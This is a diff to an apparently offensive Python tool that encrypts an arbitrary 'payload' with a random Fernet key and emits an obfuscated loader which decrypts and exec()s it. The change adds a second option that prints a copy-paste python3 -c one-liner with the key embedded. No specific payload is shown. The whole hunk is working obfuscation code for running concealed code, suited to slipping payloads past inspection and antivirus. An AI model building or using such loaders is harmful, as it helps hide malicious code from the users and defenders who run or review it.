@@ -56,9 +56,12 @@ if __name__ == "__main__":
     print(f"[*] Random key generated as: {key.decode()}…")
     print(f"[*] Encrypting payload from '{args.input}' using the randomly generated key…")
     payload = encrypt_payload(args.input, key)
-    print(f"[*] Building obfuscated Python file in '{args.target}'…")
-    with open (args.target, "w") as target_file:
+    print(f"[*] OPTION 1: Building an obfuscated Python file in '{args.output}'…")
+    with open (args.output, "w") as target_file:
         target_file.write(f"import sys;from cryptography.fernet import Fernet as F;exec(F(sys.argv[1].encode()).decrypt({payload}).decode('utf-8'))")
-    print(f"[*] You can know execute the payload using:\n\t$ 'python {args.target} {key.decode()}'.")
+    print(f"[*] You can know execute the payload using:\n\tpython {args.output} {key.decode()}.")
+    print(f"[*] OPTION 2: Building obfuscated Python string to be copy-pasted in a terminal with Python")
+    print(f"\tpython3 -c \"import sys;from cryptography.fernet import Fernet as F;exec(F('{key.decode()}'.encode()).decrypt({payload}).decode('utf-8'))\"")
+
     print(f"[*] Note that a different offset will lead to execution errors. Use this wishfully.")
 
